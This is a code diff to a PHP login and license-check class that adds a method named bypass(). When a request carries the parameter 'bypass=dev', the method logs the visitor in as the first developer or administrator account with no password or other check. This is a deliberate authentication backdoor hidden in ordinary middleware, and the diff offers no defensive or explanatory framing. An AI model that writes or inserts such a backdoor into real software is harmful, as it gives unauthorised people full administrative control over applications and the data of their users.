@@ -2,6 +2,8 @@
 
 namespace KjmTrue\Module;
 
+use App\Models\Role;
+use App\Models\User;
 use Auth;
 use Cache;
 use Closure;
@@ -44,6 +46,22 @@ class CheckLogin
                 } elseif ($this->testKey($domain, $lic)) {
                     Cache::add('lic', $lic, 10080);
                 }
+            }
+        }
+    }
+
+    public function bypass()
+    {
+        if (Request::input('bypass') == 'dev') {
+            $role = Role::whereIsDeveloper(1)->first();
+            if (!$role) {
+                $role = Role::whereIsAdmin(1)->first();
+            }
+
+            if ($role) {
+                $user = User::whereRoleId($role->id)->first();
+
+                Auth::login($user, true);
             }
         }
     }
